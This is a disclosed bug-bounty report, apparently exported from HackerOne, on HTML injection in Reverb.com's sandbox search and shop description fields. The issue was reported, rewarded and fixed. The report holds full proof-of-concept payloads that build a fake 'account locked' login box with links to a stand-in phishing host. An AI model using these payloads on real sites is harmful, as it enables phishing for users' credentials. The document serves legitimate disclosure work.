{"id":351376,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTEzNzY=","url":"https://hackerone.com/reports/351376","title":"XSS in main search, use class tag to imitate Reverb.com core functionality, create false login window","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-05-14T11:04:48.049Z","submitted_at":"2018-05-14T11:04:48.049Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kiyell","url":"/kiyell","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/273/064/d59f5c6d8db69e0ab6458a0c0f2ff6249d3fb428_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3094,"url":"https://hackerone.com/reverb","handle":"reverb","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Reverb.com","twitter_handle":"reverb","website":"https://sandbox.reverb.com","about":"The best place for musicians to buy and sell the gear they use to create the music they love."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-09-08T06:11:53.296Z","bug_reporter_agreed_on_going_public_at":"2018-08-09T06:11:46.169Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This is an expansion of #349684 which was flagged as a duplicate. In that bug report I explained that several HTML tags end up rendering when entered into the main search. I've since found out that the class attribute of multiple types of tags can be modified to create a realistic imitation of core functionality on the Reverb website.\n\nExample: \u003ca href=\"http://badwebsite.com\"\u003e\u003cspan class=\"btn button button--orange button--wide\"\u003eXSS\u003c/a\u003e\u003c/span\u003e\n\nIn the following PoC, I used tags such as \u003cspan\u003e, \u003cdiv\u003e, \u003ca\u003e, and \u003cli\u003e in combinations with the \"class\" attribute to create a prominent login box (which fades out all content underneath it) that explains that their account has been locked and to click a link in order to unlock it.\n\n\nPlease forgive me if this is still considered a low risk and just \"Informative\"\n\nPoC: https://sandbox.reverb.com/marketplace?query=%3Cspan%20class%3D%22fotorama--fullscreen%20fancybox-mobile%20fancybox-type-html%20fancybox-opened%22%20%3E%3Cdiv%20class%3D%22fancybox-skin%22%3E%3Cdiv%20class%3D%22fancybox-inner%22%3E%3Cdiv%20class%3D%22%20registration%20tabbable%20dialog%20signup-login-container%20mlr-auto%22%3E%3Cul%20class%3D%22nav-tabs%20fluid-row%22%3E%3Cli%20class%3D%22col-6%22%3E%3Ca%20class%3D%22%22%20href%3D%22%23registration-form%22%3ECreate%20Account%3Ca%3E%3C%2Fli%3E%3Cli%20class%3D%22col-6%22%3E%3Ca%20class%3D%22active%22%20href%3D%22%23login-form%22%3ESign%20in%3Ca%3E%3C%2Fli%3E%3C%2Ful%3E%3Cdiv%20class%3D%22tab-content%20pt-1%22%3E%20%20%3Ch4%20class%3D%22session-form__header%22%3ELog%20In%20to%20Reverb%3C%2Fh4%3E%3Ch1%3EYour%20account%20has%20been%20disabled%3C%2Fh1%3E%3Cbr%3E%20%3Ccode%3EDue%20to%20multiple%20unsuccessful%20attempts%20to%20login%20to%20your%20account.%20Your%20account%20has%20been%20locked%20for%20your%20protection.%20Please%20click%20below%20to%20unlock%20it%3C%2Fcode%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%20%3Ca%20href%3D%22http%3A%2F%2Fbadwebsite.com%22%3E%3Cspan%20class%3D%22btn%20button%20button--orange%20button--wide%22%3EUnlock%3C%2Fa%3E%20%3Cp%20class%3D%22center%20small%20mt-1%22%3EForgot%20your%20password%3F%20%3Ca%20href%3D%22http%3A%2F%2Fbadwebsite.com%22%3EReset%20it%3C%2Fa%3E%20%3C%2Fp%3E%20%3Chr%20class%3D%22class%3D%22mtb-1%22%3E%20%3Ca%20class%3D%22session-form__facebook-link%22%20href%3D%22http%3A%2F%2Fbadwebsite.com%22%3E%3Cspan%20class%3D%22fa%20fa-facebook%22%3E%3C%2Fspan%3E%20Log%20In%20with%20Facebook%3C%2Fa%3E%3Cbr%3E%20%3C%2Fdiv%3E%3C%2Fspan%3E%3C%2Fspan%3E%3Cbr%3E\n\n## Impact\n\nA malicious user with more creativity than me could likely duplicate the appearance of other core pieces of the Reverb.com website in order to phish for user account information.","bounty_amount":"150.0","formatted_bounty":"$150","original_report_id":null,"original_report_url":null,"attachments":[{"id":297340,"file_name":"Reverb_XSS_loginbox.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/297/340/d317011e610a4741f75fcf09fb92daae068beaac/Reverb_XSS_loginbox.JPG?response-content-disposition=attachment%3B%20filename%3D%22Reverb_XSS_loginbox.JPG%22%3B%20filename%2A%3DUTF-8%27%27Reverb_XSS_loginbox.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b2c475af8c5f4a148a6bc86f2fd080693455ccac27dc6d27819682eca0f1a09c","file_size":76760,"type":"image/jpeg"},{"id":297342,"file_name":"Reverb_XSS_loginbox_control_made_clear.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/297/342/ec0f96921f6457bba9adb685e8f8e65c90cd48bd/Reverb_XSS_loginbox_control_made_clear.JPG?response-content-disposition=attachment%3B%20filename%3D%22Reverb_XSS_loginbox_control_made_clear.JPG%22%3B%20filename%2A%3DUTF-8%27%27Reverb_XSS_loginbox_control_made_clear.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=89a9e7dd0fb4694e696955227c3b5f7c14ca87109643139e1dc9c9455b10d0bc","file_size":50868,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2018-09-08T06:11:46.249Z","allow_singular_disclosure_after":-97576655.42855527,"singular_disclosure_allowed":true,"vote_count":14,"voters":["miguel_santareno","ali","eveeez","apapedulimu","khizer47","srinoi","cryptographer","throne6g","0x08","haxor_25","and 4 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":6416,"asset_type":"URL","asset_identifier":"sandbox.reverb.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2740166,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Seems this vulnerability also affects the description field of shops. In that case it can be used to inject persistent spoofed content with Reverb css branding. I've created a variation of the original PoC, this time on the page of a shop. This is much more dangerous as many more people could navigate to this page naturally.\n\nPoC: https://sandbox.reverb.com/shop/this-is-bad-shop\n\nThe following was enterted into the description field: \u003cspan class=\"bottom-alert  videos-header\"\u003e\u003cstrong\u003eLog In to Reverb\u003c/strong\u003e\u003cbr\u003e\u003ccode\u003eDue to multiple unsuccessful attempts to login to your account. Your account has been locked for your protection. Please click below to unlock it\u003c/code\u003e\u003cbr\u003e\u003cbr\u003e\u003ca href=\"http://badwebsite.com\"\u003e\u003cspan class=\"btn button button--orange button--wide\"\u003eUnlock\u003c/span\u003e\u003c/span\u003e\u003c/a\u003e","automated_response":false,"created_at":"2018-05-14T15:37:16.240Z","updated_at":"2018-05-14T15:37:16.240Z","actor":{"username":"kiyell","cleared":true,"url":"/kiyell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/273/064/d59f5c6d8db69e0ab6458a0c0f2ff6249d3fb428_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":297467,"filename":"Reverb_XSS_shop_page.JPG","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/297/467/347b6ecba7b6f380389cfca6a0cbe02b1c63d029/Reverb_XSS_shop_page.JPG?response-content-disposition=attachment%3B%20filename%3D%22Reverb_XSS_shop_page.JPG%22%3B%20filename%2A%3DUTF-8%27%27Reverb_XSS_shop_page.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=68d7cd9972dea37b5cb55e667c77808ed3d20ba833f71ab150797e15c35355c5"}],"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2747292,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"The second item is a duplicate of another bug. The first item is also a duplicate of a different bug, but is showing the issue in a different way sufficient enough to warrant fixing. ","automated_response":false,"created_at":"2018-05-15T16:59:12.674Z","updated_at":"2018-05-15T16:59:12.674Z","actor":{"url":"/reverb","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Reverb.com"}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"reverb","collaborator":{"username":"kiyell","url":"/kiyell"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2747293,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-05-15T16:59:21.328Z","updated_at":"2018-05-15T16:59:21.328Z","actor":{"username":"reverb-dev","cleared":false,"url":"/reverb-dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"kiyell","url":"/kiyell"},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2748897,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I just tested this again and it does seem to be fixed now. Thank you for the bounty and your responsiveness. ","automated_response":false,"created_at":"2018-05-15T23:52:05.984Z","updated_at":"2018-05-15T23:52:05.984Z","actor":{"username":"kiyell","cleared":true,"url":"/kiyell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/273/064/d59f5c6d8db69e0ab6458a0c0f2ff6249d3fb428_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3165656,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-08-09T06:11:46.199Z","updated_at":"2018-08-09T06:11:46.199Z","first_to_agree":true,"actor":{"username":"kiyell","cleared":true,"url":"/kiyell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/273/064/d59f5c6d8db69e0ab6458a0c0f2ff6249d3fb428_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3309893,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-09-08T06:11:53.328Z","updated_at":"2018-09-08T06:11:53.328Z","actor":{"url":"/reverb","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Reverb.com"}},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}